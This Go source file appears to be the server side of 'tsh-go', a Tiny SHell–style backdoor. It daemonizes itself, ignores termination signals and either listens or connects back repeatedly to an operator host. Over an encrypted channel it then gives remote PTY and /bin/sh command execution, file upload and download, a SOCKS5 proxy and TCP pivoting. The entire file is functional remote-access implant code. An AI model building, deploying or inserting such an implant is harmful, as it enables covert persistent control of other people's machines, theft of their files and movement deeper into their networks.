package server

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"tsh-go/internal/bg"
	"tsh-go/internal/constants"
	"tsh-go/internal/pel"
	"tsh-go/internal/pty"
	"tsh-go/internal/socks5"
	"tsh-go/internal/utils"
)

func Run(secret []byte, host string, port int, delay int, runAsDaemon bool) {
	var isDaemon bool
	if os.Getenv("TSH_RUNNING_AS_DAEMON") == "1" {
		isDaemon = true
		os.Unsetenv("TSH_RUNNING_AS_DAEMON")
	}
	if runAsDaemon && !isDaemon {
		if bg.RunInBackground() != nil {
			log.Panicln("Failed to run as daemon")
			os.Exit(1)
		}
		os.Exit(0)
	}

	if runAsDaemon {
		// don't let system kill our child process after closing cmd.exe
		sigchan := make(chan os.Signal, 1)
		signal.Notify(sigchan,
			syscall.SIGINT,
			syscall.SIGTERM,
			syscall.SIGQUIT)
	}

	if host == "" {
		addr := fmt.Sprintf(":%d", port)
		ln, err := pel.Listen(addr, secret, false)
		if err != nil {
			log.Println(err)
			os.Exit(1)
		}
		for {
			layer, err := ln.Accept()
			if err == nil {
				go handleGeneric(layer)
			} else {
				log.Printf("Accept failed: %v\n", err)
			}
		}
	} else {
		// connect back mode
		addr := fmt.Sprintf("%s:%d", host, port)
		for {
			layer, err := pel.Dial(addr, secret, true)
			if err == nil {
				go handleGeneric(layer)
			} else {
				log.Printf("Dial failed: %v\n", err)
			}
			time.Sleep(time.Duration(delay) * time.Second)
		}
	}
}

// entry handler,
// automatically close connection after handling
// it's safe to run with goroutine
func handleGeneric(layer *pel.PktEncLayer) {
	defer layer.Close()
	defer func() {
		recover()
	}()
	buffer := make([]byte, 1)
	n, err := layer.Read(buffer)
	if err != nil || n != 1 {
		return
	}
	switch buffer[0] {
	case constants.Kill:
		os.Exit(0)
	case constants.GetFile:
		handleGetFile(layer)
	case constants.PutFile:
		handlePutFile(layer)
	case constants.RunShell:
		handleRunShell(layer)
	case constants.SOCKS5:
		handleSocks5(layer)
	case constants.Pipe:
		handlePipe(layer)
	case constants.RunShellNoTTY:
		handleRunShellNoTTY(layer)
	}
}

func handleGetFile(layer *pel.PktEncLayer) {
	buffer := make([]byte, constants.MaxMessagesize)
	filenamebuf, err := layer.ReadVarLength(buffer)
	if err != nil {
		return
	}
	filename := string(filenamebuf)
	f, err := os.Open(filename)
	if err != nil {
		return
	}
	defer f.Close()
	utils.CopyBuffer(layer, f, buffer)
	layer.Close()
}

func handlePutFile(layer *pel.PktEncLayer) {
	buffer := make([]byte, constants.MaxMessagesize)
	destbuf, err := layer.ReadVarLength(buffer)
	if err != nil {
		return
	}
	destination := filepath.FromSlash(string(destbuf))
	basenamebuf, err := layer.ReadVarLength(buffer)
	if err != nil {
		return
	}
	basename := string(basenamebuf)
	if runtime.GOOS == "windows" {
		basename = strings.ReplaceAll(basename, ":", "_")
		basename = strings.ReplaceAll(basename, "\\", "_")
	}

	// if dst is a directory, save file to dst/basename
	// otherwise, save file to dst
	if fi, err := os.Stat(destination); err == nil && fi.IsDir() {
		destination = filepath.Join(destination, basename)
	}

	f, err := os.OpenFile(destination, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	utils.CopyBuffer(f, layer, buffer)
	layer.Close()
}

func handleRunShell(layer *pel.PktEncLayer) {
	buffer1 := make([]byte, constants.MaxMessagesize)
	buffer2 := make([]byte, constants.MaxMessagesize)
	termbuf, err := layer.ReadVarLength(buffer1)
	if err != nil {
		return
	}
	term := string(termbuf)

	termsize := make([]byte, 4)
	_, err = io.ReadFull(layer, termsize)
	if err != nil {
		return
	}
	ws_row := int(termsize[0])<<8 + int(termsize[1])
	ws_col := int(termsize[2])<<8 + int(termsize[3])

	cmdbuf, err := layer.ReadVarLength(buffer1)
	if err != nil {
		return
	}
	command := string(cmdbuf)

	tp, err := pty.OpenPty(command, term, uint32(ws_col), uint32(ws_row))
	if err != nil {
		return
	}
	defer tp.Close()
	utils.DuplexPipe(layer.ReadCloser(), layer.WriteCloser(), tp.StdOut(), tp.StdIn(), buffer1, buffer2)
}

func handleRunShellNoTTY(layer *pel.PktEncLayer) {
	buffer1 := make([]byte, constants.MaxMessagesize)
	cmdbuf, err := layer.ReadVarLength(buffer1)
	if err != nil {
		return
	}
	command := string(cmdbuf)

	cmd := exec.Command("/bin/sh", "-c", command)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Println(err)
		return
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Println(err)
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Println(err)
		return
	}
	combinedOutput := io.MultiReader(stdout, stderr)
	go cmd.Run()
	utils.DuplexPipe(layer.ReadCloser(), layer.WriteCloser(), combinedOutput, stdin, buffer1, nil)
}

func handleSocks5(layer *pel.PktEncLayer) {
	srv, _ := socks5.NewClassicServer("", "")
	srv.SupportedCommands = []byte{socks5.CmdConnect} // TODO: CmdUDP
	if err := srv.Negotiate(layer); err != nil {
		log.Println(err)
		return
	}
	req, err := srv.GetRequest(layer)
	if err != nil {
		log.Println(err)
		return
	}
	log.Println("Request type", req.Cmd)
	if req.Cmd == socks5.CmdConnect {
		conn, err := req.Connect(layer)
		if err != nil {
			layer.Close()
			log.Println(err)
			return
		}
		log.Println("Connection established", conn.RemoteAddr())
		utils.DuplexPipe(layer.ReadCloser(), layer.WriteCloser(), conn, conn, nil, nil)
		// TODO: make it work with half open connection (like pipe below)
		log.Println("Connection closed", conn.RemoteAddr())
		return
	}
}

func handlePipe(layer *pel.PktEncLayer) {
	addrbuf, err := layer.ReadVarLength(nil)
	if err != nil {
		return
	}
	addr := string(addrbuf)
	log.Println("Connecting to", addr)
	parsedAddr, err := net.ResolveTCPAddr("tcp", addr)
	if err != nil {
		return
	}
	conn, err := net.DialTCP("tcp", nil, parsedAddr)
	if err != nil {
		return
	}
	defer func() {
		conn.Close()
		log.Println("Disconnected", addr)
	}()
	// utils.DuplexPipe(layer.ReadCloser(), layer.WriteCloser(), conn, conn, nil, nil)
	utils.DuplexPipe(layer.ReadCloser(), layer.WriteCloser(), utils.NewTCPConnReadCloser(conn), utils.NewTCPConnWriteCloser(conn), nil, nil)

}
